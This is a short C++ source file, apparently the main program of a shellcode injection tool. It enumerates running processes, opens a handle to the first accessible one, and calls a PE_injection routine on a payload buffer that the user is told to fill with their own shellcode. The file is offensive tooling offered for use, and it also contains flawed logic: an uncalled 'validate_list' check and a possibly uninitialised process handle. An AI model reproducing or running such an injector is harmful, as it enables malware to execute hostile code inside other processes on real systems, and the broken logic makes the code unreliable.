#include "pch.h"
#include "process_enumeration.h"
#include "PE_injection.h"
#include <iostream>

//Use the shellcode variable to enter your shellcode. Example shellcode[] = "\x41\x41\x41\x41\x41\x41\x41\x41";
unsigned char shellcode[] = "INSERT PAYLOAD HERE";

int main()
{   

    std::list<DWORD> test = enumerate_processes();
    HANDLE hProcess;
    if (validate_list) {
        for (DWORD pid : test) {
            hProcess = get_process_handle(pid);
            if (hProcess != NULL) {
                break;
            }
        }
    }

    if (hProcess != NULL) {
        PE_injection(shellcode, sizeof(shellcode), hProcess);
    }
    return 0;
}
